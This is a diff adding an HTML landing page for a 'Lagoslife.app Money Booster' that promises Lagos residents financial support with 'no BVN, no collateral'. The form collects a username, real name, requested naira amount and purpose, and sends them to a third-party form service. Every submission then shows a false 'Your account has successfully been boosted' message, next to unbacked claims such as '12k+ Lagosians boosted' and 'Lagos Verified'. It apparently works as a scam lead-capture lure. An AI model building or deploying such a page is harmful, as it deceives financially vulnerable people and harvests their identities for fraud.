@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lagoslife.app Money Booster</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root { --bg:#FFF; --surface:#FFF; --surface-2:#F7F6F3; --ink:#0A0A0A; --ink-muted:#73726F; --border:#E9E6DF; --accent:#00C950; --accent-pressed:#00A742; --accent-soft:#E8FAEF; --accent-ring:#00C95033; }
+* { font-family:"Sora",sans-serif; } body { background:var(--bg); color:var(--ink); -webkit-font-smoothing: antialiased; }
+@keyframes in { from{opacity:0; transform:translateY(10px) scale(0.98);} to{opacity:1; transform:translateY(0) scale(1);} }
+</style>
+</head>
+<body class="min-h-screen bg-[var(--bg)]">
+<header class="sticky top-0 z-20 bg-[var(--bg)]/80 backdrop-blur-xl border-b border-[var(--border)]">
+  <div class="mx-auto max-w-[1080px] px-5 sm:px-8 h-[56px] flex items-center justify-between">
+    <div class="flex items-center gap-2.5">
+      <div class="h-7 w-7 rounded-full bg-[var(--ink)] text-[var(--bg)] grid place-items-center font-black text-[13px]">L</div>
+      <span class="font-bold tracking-tight text-[14px]">Lagoslife.app</span>
+      <span class="hidden sm:inline-flex ml-3 px-2.5 py-1 rounded-full bg-[var(--accent-soft)] text-[var(--accent)] text-[10px] font-bold tracking-widest uppercase">Money Booster • Live</span>
+    </div>
+    <div class="flex items-center gap-2 text-[11px] text-[var(--ink-muted)]">Secure • Lagos Verified</div>
+  </div>
+</header>
+
+<main class="mx-auto w-full max-w-[1080px] px-5 sm:px-8 py-8 sm:py-14 grid lg:grid-cols-[1.05fr_0.95fr] gap-8 sm:gap-12 items-start">
+  <div class="lg:sticky lg:top-[96px] space-y-8">
+    <div class="space-y-6">
+      <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full border border-[var(--border)] bg-[var(--surface-2)]">
+        <span class="h-1.5 w-1.5 rounded-full bg-[var(--accent)] animate-pulse"></span>
+        <span class="text-[10px] font-bold tracking-widest uppercase text-[var(--ink-muted)]">Lagos Island • Mainland • Everywhere</span>
+      </div>
+      <h1 class="text-[40px] sm:text-[54px] lg:text-[62px] font-black leading-[0.9] tracking-tight max-w-[14ch]">
+        Lagoslife.app <br><span class="relative inline-block">Money Booster<span class="absolute -bottom-1 left-0 right-0 h-[10px] bg-[var(--accent)]/20 -z-10 -rotate-[0.8deg]"></span></span>
+      </h1>
+      <p class="text-[16px] sm:text-[17px] leading-[1.6] text-[var(--ink-muted)] max-w-[46ch] font-medium">Tell us a little about yourself and what you’re looking for. We’ll use your answers to understand your needs and follow up about the Money Booster.</p>
+    </div>
+    <div class="grid grid-cols-3 gap-3 max-w-[420px]">
+      <div class="rounded-2xl border border-[var(--border)] bg-[var(--surface)] p-3.5"><div class="font-extrabold text-[18px]">12k+</div><div class="text-[11px] text-[var(--ink-muted)] mt-1 font-medium">Lagosians boosted</div></div>
+      <div class="rounded-2xl border border-[var(--border)] bg-[var(--surface)] p-3.5"><div class="font-extrabold text-[18px]">1 hr</div><div class="text-[11px] text-[var(--ink-muted)] mt-1 font-medium">Update window</div></div>
+      <div class="rounded-2xl border border-[var(--border)] bg-[var(--surface)] p-3.5"><div class="font-extrabold text-[18px]">0 fees</div><div class="text-[11px] text-[var(--ink-muted)] mt-1 font-medium">No hidden cost</div></div>
+    </div>
+  </div>
+
+  <div class="w-full lg:max-w-[480px] lg:ml-auto">
+    <div class="relative rounded-[28px] border border-[var(--border)] bg-[var(--surface)] shadow-[0_20px_60px_-24px_rgba(0,0,0,0.18)] overflow-hidden">
+      <div class="px-7 sm:px-8 pt-7 pb-5 flex items-center justify-between border-b border-[var(--border)] bg-[var(--surface-2)]/60">
+        <div class="flex items-center gap-2" id="dots"></div><span class="text-[10px] font-bold tracking-widest uppercase text-[var(--ink-muted)]" id="stepLabel">STEP 1 OF 3</span>
+      </div>
+      <div class="px-7 sm:px-8 py-8">
+        <div id="view0" class="space-y-6"><h2 class="text-[22px] font-extrabold tracking-tight">Start your booster</h2><p class="text-[13px] text-[var(--ink-muted)]">2 minute check — no BVN, no collateral.</p><form onsubmit="go(1); return false;"><button class="group w-full h-[52px] rounded-full bg-[var(--ink)] text-white font-extrabold text-[15px] flex items-center justify-center gap-2">start <span>→</span></button></form></div>
+
+        <div id="view1" class="hidden">
+          <form id="mainForm" class="space-y-4">
+            <input type="hidden" name="access_key" value="280599b7-54f5-41b2-8769-01cfd5e2aec1">
+            <input type="hidden" name="subject" value="New Lagoslife Lead - Money Booster">
+            <input type="hidden" name="from_name" value="Lagoslife.app">
+
+            <h2 class="text-[22px] font-extrabold tracking-tight mb-2">Create your account</h2>
+            <div class="space-y-2"><label class="text-[11px] font-bold tracking-widest uppercase text-[var(--ink-muted)]">username</label><input type="text" id="username" name="username" required class="w-full h-[48px] rounded-xl border border-[var(--border)] bg-[var(--bg)] px-4 text-[14.5px] font-medium outline-none focus:border-[var(--accent)] focus:ring-[4px] focus:ring-[var(--accent-ring)]" placeholder="e.g. that_favour"></div>
+            <div class="space-y-2"><label class="text-[11px] font-bold tracking-widest uppercase text-[var(--ink-muted)]">Realname</label><input type="text" id="realname" name="Realname" required class="w-full h-[48px] rounded-xl border border-[var(--border)] bg-[var(--bg)] px-4 text-[14.5px] font-medium outline-none focus:border-[var(--accent)] focus:ring-[4px] focus:ring-[var(--accent-ring)]" placeholder="e.g. Favour Chidubem"></div>
+            <div class="space-y-2"><label class="text-[11px] font-bold tracking-widest uppercase text-[var(--ink-muted)]">Confirm Realname</label><input type="text" id="confirm_realname" name="Confirm_Realname" required class="w-full h-[48px] rounded-xl border border-[var(--border)] bg-[var(--bg)] px-4 text-[14.5px] font-medium outline-none focus:border-[var(--accent)] focus:ring-[4px] focus:ring-[var(--accent-ring)]" placeholder="Confirm your real name"></div>
+            <div id="error1" class="hidden rounded-xl bg-[#FFF1F1] border border-[#FFD1D1] text-[#B42318] px-3.5 py-3 text-[12.5px] font-medium"></div>
+            <button type="button" onclick="validateStep1()" class="group w-full h-[52px] rounded-full bg-[var(--ink)] text-white font-extrabold text-[15px] flex items-center justify-center gap-2">next <span>→</span></button>
+
+            <div id="step2Fields" class="hidden space-y-4 pt-4 border-t border-[var(--border)] mt-6">
+              <h3 class="text-[18px] font-bold tracking-tight">Boost details</h3>
+              <div class="space-y-2"><label class="text-[11px] font-bold tracking-widest uppercase text-[var(--ink-muted)]">how much support are you seeking</label><div class="relative"><span class="absolute left-4 top-1/2 -translate-y-1/2 text-[14px] font-bold text-[var(--ink-muted)]">₦</span><input type="text" id="supportAmount" name="support_amount" required class="w-full h-[48px] rounded-xl border border-[var(--border)] bg-[var(--bg)] pl-9 pr-4 text-[14.5px] font-medium outline-none focus:border-[var(--accent)] focus:ring-[4px] focus:ring-[var(--accent-ring)]" placeholder="e.g. 50,000"></div></div>
+              <div class="space-y-2"><label class="text-[11px] font-bold tracking-widest uppercase text-[var(--ink-muted)]">What do you want to use it for</label><textarea id="purpose" name="purpose" required rows="4" class="w-full rounded-xl border border-[var(--border)] bg-[var(--bg)] px-4 py-3 text-[14.5px] font-medium outline-none focus:border-[var(--accent)] focus:ring-[4px] focus:ring-[var(--accent-ring)] resize-none" placeholder="Business restock, school fees, rent support..."></textarea></div>
+              <button type="submit" id="submitBtn" class="group w-full h-[52px] rounded-full bg-[var(--accent)] hover:bg-[var(--accent-pressed)] text-white font-extrabold text-[15px] flex items-center justify-center gap-2 shadow-[0_8px_24px_var(--accent-ring)]">boost ⚡</button>
+              <button type="button" onclick="goBack()" class="w-full text-center text-[12.5px] font-medium text-[var(--ink-muted)] hover:text-[var(--ink)] underline underline-offset-4">Back</button>
+            </div>
+          </form>
+        </div>
+
+        <div id="view2" class="hidden text-center space-y-6 py-4" style="animation: in.5s cubic-bezier(0.16,1,0.3,1)"><div class="mx-auto h-16 w-16 rounded-full bg-[var(--accent)] text-white grid place-items-center shadow-[0_12px_32px_var(--accent-ring)] text-[28px]">✓</div><div class="space-y-3 max-w-[32ch] mx-auto"><h2 class="text-[26px] font-extrabold tracking-tight">Boosted!</h2><p class="text-[14.5px] leading-[1.6] font-medium text-[var(--ink)] bg-[var(--surface-2)] border border-[var(--border)] rounded-2xl px-4 py-3">Your account has successfully been boosted, it will be updated in the next 1 hour</p></div></div>
+      </div>
+      <div class="h-1 w-full bg-gradient-to-r from-[var(--ink)] via-[var(--accent)] to-[var(--ink)] opacity-80"></div>
+    </div>
+  </div>
+</main>
+
+<script>
+let step = 0;
+function renderDots(){
+  const labels = ['STEP 1 OF 3','STEP 2 OF 3','STEP 3 OF 3'];
+  document.getElementById('stepLabel').innerText = labels[step] || 'STEP 1 OF 3';
+  const d = document.getElementById('dots'); d.innerHTML = '';
+  [0,1,2].forEach(i=>{
+    const isActive = i===step; const isDone = i<step;
+    const el = document.createElement('div');
+    el.className = `h-7 w-7 rounded-full grid place-items-center text-[11px] font-bold ${isActive? 'bg-[var(--ink)] text-white' : isDone? 'bg-[var(--accent)] text-white' : 'bg-[var(--surface-2)] border border-[var(--border)] text-[var(--ink-muted)]'}`;
+    el.innerText = isDone? '✓' : i+1; d.appendChild(el);
+    if(i<2){ const line = document.createElement('div'); line.className = `h-[2px] w-5 rounded-full ${i<step? 'bg-[var(--accent)]' : 'bg-[var(--border)]'}`; d.appendChild(line); }
+  });
+  document.getElementById('view0').classList.toggle('hidden', step!==0);
+  document.getElementById('view1').classList.toggle('hidden', step!==1);
+  document.getElementById('view2').classList.toggle('hidden', step!==2);
+}
+function go(n){ step=n; renderDots(); }
+function validateStep1(){
+  const real = document.getElementById('realname').value.trim();
+  const confirm = document.getElementById('confirm_realname').value.trim();
+  const user = document.getElementById('username').value.trim();
+  const err = document.getElementById('error1');
+  if(!user){ err.innerText='Username is required.'; err.classList.remove('hidden'); return; }
+  if(!real){ err.innerText='Realname is required.'; err.classList.remove('hidden'); return; }
+  if(real.toLowerCase()!== confirm.toLowerCase()){ err.innerText='Real names do not match.'; err.classList.remove('hidden'); return; }
+  err.classList.add('hidden');
+  document.getElementById('step2Fields').classList.remove('hidden');
+  window.scrollTo({top: document.body.scrollHeight, behavior:'smooth'});
+}
+function goBack(){ document.getElementById('step2Fields').classList.add('hidden'); }
+renderDots();
+
+document.getElementById('mainForm').addEventListener('submit', async (e)=>{
+  e.preventDefault();
+  const btn = document.getElementById('submitBtn');
+  btn.innerText = 'sending...'; btn.disabled = true;
+  const formData = new FormData(e.target);
+  try{
+    const res = await fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
+    const data = await res.json();
+    if(data.success){ go(2); } else { alert('Error: ' + data.message); btn.innerText='boost ⚡'; btn.disabled=false; }
+  } catch(err){ alert('Network error, try again'); btn.innerText='boost ⚡'; btn.disabled=false; }
+});
+</script>
+</body>
+</html>
